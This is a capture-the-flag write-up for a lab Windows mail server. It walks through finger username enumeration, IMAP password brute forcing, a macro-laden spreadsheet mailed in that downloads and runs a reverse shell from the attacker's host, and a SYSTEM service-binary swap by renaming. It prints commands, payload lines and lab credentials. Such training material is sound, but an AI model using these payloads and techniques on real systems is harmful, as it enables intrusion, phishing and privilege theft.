---
machine: Hepet
platform: Proving Grounds
category: Windows
difficulty: Insane
tags: [mercury-mail, finger-enumeration, imap, phishing, macro, service-binary-hijack]
date: 2026-07-21
status: retired
summary: A Windows box running a full legacy mail server stack (SMTP/POP3/IMAP/finger/HTTP) — testing username discovery via the finger protocol, IMAP credential bruteforcing, an office-macro phishing payload delivered through the mail server's own document-processing automation, and a running SYSTEM service binary swapped out via a file-rename trick to finish the box.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/hepet]
└─$ nmap-full 192.168.142.140
[*] Running fast port discovery on 192.168.142.140...
[sudo] password for kali: 
[*] Open ports: 25,79,105,106,110,135,139,143,443,445,2224,5040,8000,11100,20001,33006,49664,49665,49666,49667,49668,49669
[*] Running full scan on 192.168.142.140...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 20:21 -0400
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.45% done; ETC: 20:23 (0:00:05 remaining)
Nmap scan report for 192.168.142.140
Host is up (0.035s latency).

PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: APOP USER UIDL EXPIRE(NEVER) TOP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: IMAP4rev1 CAPABILITY complete AUTH=PLAIN OK X-MERCURY-1A0001
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Time Travel Company Page
|_http-open-proxy: Proxy might be redirecting requests
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-22T00:23:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.86 seconds
```

We have a full mercury mailing stack, a couple webapps, with the main one being on port 8000, an FTP server with allow anonymous logon and ftp-bounce, a database on 33006, and vnc running on port 11100.

We can check out some basic finger enum commands and we find the same output as nmap found:

```bash
┌──(kali㉿kali)-[~/oscp/hepet]
└─$ finger @target
Login: Admin         Name: Mail System Administrator

[No profile information]
                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/hepet]
└─$ finger admin@target
Login: admin         Name: Mail System Administrator

[No profile information]
```

We will go ahead and run a feroxbuster scan on the Apache webapp on port 8000, this doesnt yield anything immediately interesting.

The webapp gives us the names of some of the staff:
- Ela Arwel
- Charlotte D.
- Magnus U.
- Agnes T.
- Jonas K.
- Martha U.

I go ahead and recursively download the ftp share on port 20001:
`wget -r --no-passive ftp://anonymous:anonymous@10.129.5.0/`

I couldnt find anything immediately useful in the ftp share so I made a users wordlist of the names found on the apache website and ran them through finger to see which were valid logins:

```bash
┌──(kali㉿kali)-[~/oscp/hepet/target:20001/src]
└─$ for name in $(cat users); do finger $name@target; done
elaarwel is not known at this site.
ela.arwel is not known at this site.
ela is not known at this site.
charlotted is not known at this site.
charlotte.d is not known at this site.
Login: charlotte         Name: Charlotte

[No profile information]
magnusu is not known at this site.
magnus.u is not known at this site.
Login: magnus         Name: Magnus

[No profile information]
agnest is not known at this site.
agnes.t is not known at this site.
Login: agnes         Name: Agnes

[No profile information]
jonask is not known at this site.
jonas.k is not known at this site.
Login: jonas         Name: Jonas

[No profile information]
marthau is not known at this site.
martha.u is not known at this site.
Login: martha         Name: Martha

[No profile information]
Login: admin         Name: Mail System Administrator

[No profile information]
administrator is not known at this site.
```

We see the valid logins are: charlotte, magnus, agnes, jonas, martha, admin. All but ela, strange.

If we use [[cewl]] and hydra bruteforce against imap with our user logins and cewl wordlist we find legitimate credpair: `jonas:SicMundusCreatusEst`

`hydra -l jonas -P custom -f targer imap -V`

We can use this credpair to access the imap service and look for emails in jonas' inbox.

We can manually enumerate imap with curl:

```bash
# to view inbox entries
┌──(kali㉿kali)-[192.168.45.225]-[~]
└─$ curl "imap://192.168.204.140/INBOX?ALL" --user "jonas:SicMundusCreatusEst"
* SEARCH 1 2 3 4 5
  
# to view email contents from uid entries gathered above
──(kali㉿kali)-[192.168.45.225]-[~]
└─$ curl "imap://192.168.204.140/INBOX;UID=2" --user "jonas:SicMundusCreatusEst"
```

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~]
└─$ curl "imap://192.168.204.140/INBOX;UID=2" --user "jonas:SicMundusCreatusEst"
Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:41 -0700
X-Envelope-To: <jonas@localhost>
Return-path: <mailadmin@localhost>
Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000001;
   19 Oct 2020 12:28:40 -0700
Message-ID: <359094.447081105-sendEmail@kali>
From: "mailadmin@localhost" <mailadmin@localhost>
To: "agnes@localhost" <agnes@localhost>
Cc: "jonas@localhost" <jonas@localhost>,
 "magnus@localhost" <magnus@localhost>
Subject: Important
Date: Mon, 19 Oct 2020 19:28:39 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-808784.915440814"
X-PMFLAGS: 570949760 0 5 YGWVEUL6.CNM

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-808784.915440814
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 

Sorry for the inconveniences.


------MIME delimiter for sendEmail-808784.915440814--
```

We see that all LibreOffice spreadsheets and documents will be processed by the mail server directly. Given that libreoffice spreadsheets/docs can run macros much like word documents, we should try to craft an auto executing revshell for when a document is opened and email it via SMTP.

## Foothold

We can find a revshell macro generator github called: [https://github.com/jotyGill/macro-generator/blob/main/macro-generator.py](https://github.com/0bfxgh0st/MMG-LO)

I first generated a revshell with msfvenom:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/hepet]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

I then hosted my revshell on a local python server on 9999 and swapped out the `build_payload` with `build_payload = (r'''powershell -exec bypass -c "iex(iwr -uri http://192.168.45.225:9999/rev.exe -UseBasicParsing)"''')`

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/hepet]
└─$ python3 mmg-ods.py windows 192.168.45.225 4444                                                       
[+] Payload: windows reverse shell
[+] Creating malicious .ods file

Done.
```

Then I sent the file via swaks:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/hepet]
└─$ sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.204.140 --suppress-data
=== Trying 192.168.204.140:25...
=== Connected to 192.168.204.140.
<-  220 localhost ESMTP server ready.
 -> EHLO kali
<-  250-localhost Hello kali; ESMTPs are:
<-  250-TIME
<-  250-SIZE 0
<-  250 HELP
 -> MAIL FROM:<jonas@localhost>
<-  250 Sender OK - send RCPTs.
 -> RCPT TO:<mailadmin@localhost>
<-  250 Recipient OK - send RCPT or DATA.
 -> DATA
<-  354 OK, send data, end with CRLF.CRLF
 -> 196 lines sent
<-  250 Data received OK.
 -> QUIT
<-  221 localhost Service closing channel.
=== Connection closed with remote host.
```

It takes a few minutes but eventually I see a GET request to my python server for reverse.exe but the listener doesn't catch the shell:
`192.168.204.140 - - [22/Jul/2026 12:02:56] "GET /reverse.exe HTTP/1.1" 200 -`

This is because iex only interprets .ps1 files and our payload is an .exe

We try rebuilding the payload as: `build_payload = (r'''iwr -uri http://192.168.45.225:9999/reverse.exe -OutFile C:\Windows\Temp\rev.exe; C:\Windows\Temp\rev.exe''')` but we need to revert the box to have the mail server execute the payload again.

Finally we get a shell as ela arwel:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/hepet]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.204.140] 50055
Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.                                                                                                                       
C:\Program Files\LibreOffice\program>whoami
whoami                                                                                                                                                                
hepet\ela arwel                                                                                                                                                       
C:\Program Files\LibreOffice\program>
```

## Privilege Escalation

One Ela Arwel's desktop we see the script that is responsible for "processing" our phishing attack, called `check_email.ps1`:

```powershell
type check_email.ps1
### Close everything
Remove-Item -Path 'C:\Users\Ela Arwel\Desktop\email_files\*'
Stop-Process -Name 'soffice.*'

### Import the dll
[Reflection.Assembly]::LoadFile("C:\ImapX.dll")

### Create a client object
$client = New-Object ImapX.ImapClient

###set the fetching mode to retrieve the part of message you want to retrieve, 
###the less the better

$client.Behavior.MessageFetchMode = "Full"
$client.Host = "localhost"
$client.Port = 143
$client.Connect()

$user = "mailadmin"
$password = "7vRx1jii9"
$client.Login($user,$password)

$client.Behavior.AutoPopulateFolderMessages = $true

$messages = $client.Folders.Inbox.Search("ALL", $client.Behavior.MessageFetchMode, 1000)

if ($messages.Count -gt 0) {
    foreach($m in $messages){
        $m.Subject
    
        foreach($r in $m.Attachments){
            $r.Download()
            $r.Save('C:\Users\Ela Arwel\Desktop\email_files\')
        }
        $m.Remove();
    }
    Invoke-Item 'C:\Users\Ela Arwel\Desktop\email_files\*.xls'
    Invoke-Item 'C:\Users\Ela Arwel\Desktop\email_files\*.ods'
}
$client.Logout();

```

We see a directory called `Veyon` in our user Ela's directory, running this through searchsploit we see a potential vulnerability for an unquoted service path attack

We run winpeas and find some interesting stuff:

```text
Some AutoLogon credentials were found
    DefaultUserName               :  Ela Arwel
    DefaultPassword               :  LadderWheelGallon443
```

```text
��������͹ Home folders found (T1083)
    C:\Users\Administrator : Ela Arwel [Allow: AllAccess]
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Ela Arwel : Ela Arwel [Allow: AllAccess]
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]

```

```text
C:\Program Files\WinGate(Authenticated Users [Allow: AllAccess])
    C:\xampp(Users [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles])
```

```text
Folder: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Ela Arwel [Allow: AllAccess]
    File: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 
    FilePerms: Ela Arwel [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
    
    File: C:\Users\Ela Arwel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\LibreOffice 7.0.lnk (Unquoted and Space detected) - C:\Users\Ela Arwel\AppData\Roaming\Microsoft\Windows,C:\Users\Ela Arwel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

```text
VeyonService(Veyon Solutions - Veyon Service)[C:\Users\Ela Arwel\Veyon\veyon-service.exe] - Auto - Running - No quotes and Space detected
    File Permissions: Ela Arwel [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Users\Ela Arwel\Veyon (Ela Arwel [Allow: AllAccess])
```

We have perms over everything in Ela Arwel's directory including the veyon-service.exe which is executed by SYSTEM service `VeyonService`. I tried deleting it and overwriting with my own binary but it failed as the service was being run actively. I attempted stopping it and it failed as I lacked permissions to stop `VeryonService`.

We must employ `Rename-Item`, which is capable of renaming our binary the service is running to something else, making room for us to name our own binary `veyon-service.exe`

### Swapping a Running SYSTEM Service Binary with Rename-Item

```powershell
PS C:\Users\Ela Arwel\veyon> Rename-Item -Path veyon-service.exe -NewName veyonservices.exe
Rename-Item -Path veyon-service.exe -NewName veyonservices.exe

PS C:\Users\Ela Arwel\veyon> Rename-Item -Path mal.exe -NewName veyon-service.exe
Rename-Item -Path mal.exe -NewName veyo-service.exe
```

```powershell
PS C:\Users\Ela Arwel\veyon> sc.exe qc VeyonService
sc.exe qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Now our revshell .exe should be called whenever the box starts up, all we have to do is restart the box.

We can restart the box with our SeShutdownPrivilege and our command `shutdown /r /t 0`:

```powershell
PS C:\Users\Ela Arwel\veyon> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

After running `shutdown /r /t 0` we catch a shell in our listener as system:

```bash
┌──(kali㉿kali)-[~/oscp/hepet]
└─$ rlwrap -cAr nc -lvnp 5555 
listening on [any] 5555 ...
connect to [192.168.45.188] from (UNKNOWN) [192.168.133.140] 49668
Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```
